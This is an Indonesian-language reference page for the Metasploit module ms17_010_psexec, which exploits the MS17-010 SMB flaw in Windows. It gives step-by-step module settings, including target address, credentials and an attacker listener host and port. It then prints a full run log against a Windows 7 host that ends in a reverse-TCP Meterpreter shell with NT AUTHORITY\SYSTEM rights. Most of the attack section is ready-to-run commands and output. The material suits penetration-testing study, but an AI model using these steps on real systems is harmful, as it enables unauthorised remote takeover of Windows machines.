# ms17_010_psexec

Modul ini akan memanfaatkan kerentanan SMB pada `MS17-010` untuk mencapai primitif `write-what-where`. Ini kemudian digunakan untuk menimpa informasi sesi koneksi menjadi sesi `Administrator`. Dari situ, eksekusi kode payload `psexec` normal dilakukan.

Modul ini mengeksploitasi kebingungan tipe antara permintaan `Transaction` dan `WriteAndX` serta kondisi balapan (`race condition`) pada permintaan `Transaction`, seperti yang terlihat pada eksploitasi `EternalRomance`, `EternalChampion`, dan `EternalSynergy`. Rantai eksploitasi ini lebih andal dibandingkan eksploitasi `EternalBlue`, tetapi memerlukan `named pipe`.

## Penulis
- sleepya
- zerosum0x0
- Shadow Brokers
- Equation Group

## Platform
- `Windows`


## Arsitektur
- `x86`, `x64`

## Cara Penggunaan di Metasploit

```
use exploit/windows/smb/ms17_010_psexec
set PAYLOAD <PAYLOAD>
set RHOSTS <IP_TARGET>
set RPORT 445
set SMBUser <USERNAME>
set SMBPass <PASSWORD>
set LHOST <IP_ATTACKER>
set LPORT <PORT_LISTENER>
set TARGET <ID>
set VERBOSE true
```

Hasil output-nya seperti ini:

```
[*] Started reverse TCP handler on 192.168.1.11:4444 
[*] 192.168.1.52:445 - Authenticating to 192.168.1.52 as user 'admin'...
[*] 192.168.1.52:445 - Target OS: Windows 7 Professional 7601 Service Pack 1
[*] 192.168.1.52:445 - Connected to named pipe: \netlogon
[*] 192.168.1.52:445 - Frag pool info leak: arch=x64, size=0x10
[*] 192.168.1.52:445 - Attempting leak #0
[*] 192.168.1.52:445 - Leaked connection struct (0xfffffa80036517a0), performing WriteAndX type confusion
[*] 192.168.1.52:445 - Control of groom transaction
[*] 192.168.1.52:445 - Built a write-what-where primitive...
[*] 192.168.1.52:445 - Overwrote IsNullSession = 0, IsAdmin = 1 at 0xfffff8a001f09e9a
[*] 192.168.1.52:445 - Overwrote token SID security context with fake context
[+] 192.168.1.52:445 - Overwrite complete... SYSTEM session obtained!
[*] 192.168.1.52:445 - Checking for System32\WindowsPowerShell\v1.0\powershell.exe
[*] 192.168.1.52:445 - PowerShell found
[*] 192.168.1.52:445 - Selecting PowerShell target
[*] 192.168.1.52:445 - Powershell command length: 4355
[*] 192.168.1.52:445 - Executing the payload...
[*] 192.168.1.52:445 - Binding to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.1.52[\svcctl] ...
[*] 192.168.1.52:445 - Bound to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.1.52[\svcctl] ...
[*] 192.168.1.52:445 - Obtaining a service manager handle...
[*] 192.168.1.52:445 - Creating the service...
[+] 192.168.1.52:445 - Successfully created the service
[*] 192.168.1.52:445 - Starting the service...
[+] 192.168.1.52:445 - Service start timed out, OK if running a command or non-service executable...
[*] 192.168.1.52:445 - Removing the service...
[+] 192.168.1.52:445 - Successfully removed the service
[*] 192.168.1.52:445 - Closing service handle...
[+] 192.168.1.52:445 - SYSTEM session cleaned up.
[*] Sending stage (177734 bytes) to 192.168.1.52
[*] Meterpreter session 3 opened (192.168.1.11:4444 -> 192.168.1.52:49307) at 2025-05-17 09:05:11 +0700

meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
```

## Referensi
- [Rapid7](https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_psexec/)
